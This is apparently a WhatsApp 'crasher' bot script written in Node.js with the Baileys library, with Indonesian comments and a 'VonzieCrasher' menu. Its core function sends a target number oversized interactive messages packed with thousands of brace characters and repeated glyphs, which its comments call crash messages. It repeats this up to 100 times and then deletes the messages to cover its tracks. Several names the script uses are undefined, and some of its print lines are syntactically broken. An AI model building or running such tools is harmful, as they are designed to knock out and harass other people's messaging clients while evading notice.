// bot.js
const {
  default: makeWASocket,
  useMultiFileAuthState,
  makeCacheableSignalKeyStore,
  fetchLatestBaileysVersion,
  downloadMediaMessage
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const fs = require("fs");
const path = require("path");
const readline = require("readline");

// =============== Helper ===============
function question(query) {
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise(resolve => rl.question(query, ans => {
    rl.close();
    resolve(ans);
  }));
}

// =============== Main ===============
async function clientstart() {
  const { state, saveCreds } = await useMultiFileAuthState("session");
  const { version } = await fetchLatestBaileysVersion();

  const conn = makeWASocket({
    printQRInTerminal: false,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(
        message.buttonsMessage ||
        message.templateMessage ||
        message.listMessage
      );
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              ...message,
            },
          },
        };
      }
      return message;
    },
    version,
    browser: ["Mark-Zuckerberg", "Chrome", "20.0.04"],
    logger: pino({ level: "silent" }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino().child({
        level: "silent",
        stream: "store",
      })),
    }
  });

  conn.ev.on("creds.update", saveCreds);

  // =============== Pairing Code ===============
  if (!conn.authState.creds.registered) {
    const phoneNumber = await question("📱 Masukin nomor WhatsApp kamu (contoh: 62xxx):\n");
    const code = await conn.requestPairingCode(phoneNumber.trim());
    console.log(chalk.green.bold(`🔑 Pairing Code: ${code}`));
  }

  // =============== Connection Update ===============
  conn.ev.on("connection.update", ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      console.log(chalk.red("❌ Koneksi terputus, mencoba reconnect..."));
      clientstart();
    } else if (connection === "open") {
      console.log(chalk.green("✅ Bot berhasil connect ke WhatsApp!"));
    }
  });

  // =============== Message Handler (Case) ===============
  conn.ev.on("messages.upsert", async ({ messages }) => {
    const m = messages[0];
    if (!m.message) return;

    const from = m.key.remoteJid;
    const isGroup = from.endsWith("@g.us");
    const type = Object.keys(m.message)[0];
    const body =
      (type === "conversation" && m.message.conversation) ? m.message.conversation :
      (type === "imageMessage" && m.message.imageMessage.caption) ? m.message.imageMessage.caption :
      (type === "videoMessage" && m.message.videoMessage.caption) ? m.message.videoMessage.caption :
      (type === "extendedTextMessage" && m.message.extendedTextMessage.text) ? m.message.extendedTextMessage.text :
      (type === "buttonsResponseMessage" && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId :
      (type === "listResponseMessage" && m.message.listResponseMessage.singleSelectReply.selectedRowId) ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      "";

    const command = body.startsWith("!") ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
    const args = body.trim().split(/ +/).slice(1);

    try {
    const mode = {
key: {
participant: `13135559098@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "13135559098@s.whatsapp.net"
} : {}),
id: `${Date.now()}-${Math.random().toString(36).slice(2)}`
},
message: {
contactMessage: {
displayName: `Masih Pemula`,
vcard: true,
thumbnailUrl: `https://k.top4top.io/p_3528gs2jm0.png`,
sendEphemeral: true
}},
status: 1,
participant: "13135559098@s.whatsapp.net"
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function pungtion(conn, target, count = 3) {
  const messageIds = [];

  for (let i = 0; i < count; i++) {
    try {
      const message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 99999999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
              },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(9999),
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_copy",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "cta_cancel_reminder",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "send_location",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{".repeat(15000),
                    version: 3,
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "ꦽ".repeat(3000),
                    version: 3,
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({ status: true }),
                    version: 3,
                  },
                  {
                    name: "camera_permission_request",
                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
                    version: 3,
                  },
                ],
              },
            },
          },
        },
      };

      // kirim message crash
      const msg = await conn.sendMessage(target, message);
      const messageId = msg.key.id;
      messageIds.push(messageId);

      console.log(✅ [${i + 1}/${count}] Vexnew crash terkirim: ${messageId});

      await sleep(600);
    } catch (e) {
      console.error("❌ Error NewEra:", e);
    }
  }

  // 🔥 hapus semua pesan setelah dikirim
  for (let i = 0; i < messageIds.length; i++) {
    const id = messageIds[i];
    await sleep(1000);
    await conn.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: false,
        id,
        participant: conn.user.id,
      },
    });
    console.log(🗑️ Pesan ${i + 1} dihapus);
  }

  console.log("✅ Semua pesan crash sudah dihapus");
}

      switch (command) {

case 'menu':{
let anj = `
> こんにちは、Vonzie Crasher スクリプト ユーザーの皆さん。開発者として、これを良いことに使用していただければとても嬉しいです。
\`── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
\`⭔\` Devoloper : RyuMaOffc
\`⭔\` Mode : Public Bot
\`⭔\` Status : Public
\`⭔\` Version : 1 
\`⭔\` Name Scrip : VonzieCrasher͏͏͏͏


🌹 الحب الحقيقي هو الذي يقربك إلى الله لا يبعدك عنه.

> Cinta sejati adalah cinta yang mendekatkanmu kepada Allah, bukan yang menjauhkanmu dari-Nya.

`
const buttons = [
  {
    buttonId: ".buysc",
    buttonText: {
      displayText: "🌸"
    },
   }, {
    buttonId: ".tqto", 
    buttonText: {
      displayText: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨"
    }
  }
]

const buttonMessage = {
    document: fs.readFileSync("./logo.webp"),
    mimetype: "image/png",
    fileName: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
    jpegThumbnail: tdxlol,
    fileLength: 999999999999999,
    pageCount: 99999,
    caption: anj,
    footer: '© 𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟',
    buttons: buttons,
    headerType: 9,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `hi ${pushname}`, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "ade",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'WEBP', 
        previewType: 'WEBP', 
        sourceUrl: "https://t.me/RyuAj", 
        thumbnailUrl: "https://files.catbox.moe/6y35hh.jpg", 
        title: 'Bot WhatsApp',
      },
    },
    viewOnce: true,
    headerType: 6
  };
  
  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𝐏𝐢𝐥𝐢𝐡 𝐌𝐞𝐧𝐮",
                    sections: [
                        {
                            title: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            highlight_label: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                            rows: [
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: "ShowAllMenuBug",
                                    description: "War Mode",
                                    id: ".warmode"
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowMenuOwner",
                                    description: "Menampilkan Owner Menu",
                                    id: ".ownerryu"    
                                },
                                {
                                    header: "𝑽𝒐𝒏𝒛𝒊𝒆𝑿𝑪𝒓𝒂𝒔𝒉𝒆𝒓⇜🚀᭟",
                                    title: ".ShowBugMenu",
                                    description: "Mode Bug",
                                    id: ".bugmenu"    
                                }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: warmodes });
  };
  break;


case 'systemvcx': case 'vonziexplague': {
    
    if (!q) 
        return m.reply(`𝗖𝗮𝗿𝗮 𝗽𝗮𝗸𝗮𝗶i : ${prefix + command} 𝟲𝟮×××`);
    
    // Proses nomor
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) 
        return m.reply(`Contoh : ${prefix + command} 𝟲𝟮×××`);
    
    let target = bijipler + "@s.whatsapp.net";
    let DoneBug = `
┏─═─═─═─═─═─═─═─═─⪩
│┏─⊱ ⌁⃰𝐒𝐞͠𝐧͜𝐝 𝐒𝐮͠𝐜𝐜͜𝐞𝐬͠𝐟𝐮𝐥͢𝐥𝐲 ⍣᳟
║▢  
│┗─⊱ ${bijipler}
╚─═─═─═─═─═─═─═─═─⪩
`;

    // Kirim pesan konfirmasi
    conn.sendMessage(from, { 
        image: { url: `https://files.catbox.moe/6y35hh.jpg` },
        caption: DoneBug,
        gifPlayback: true,
    }, { quoted: warmodes });
    
    await sleep(1000)
    
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
    await tespungtion(target);
    await sleep(1500);
   }
}

    } catch (err) {
      console.error("❌ Error in case handler:", err);
    }
  });
}

clientstart();
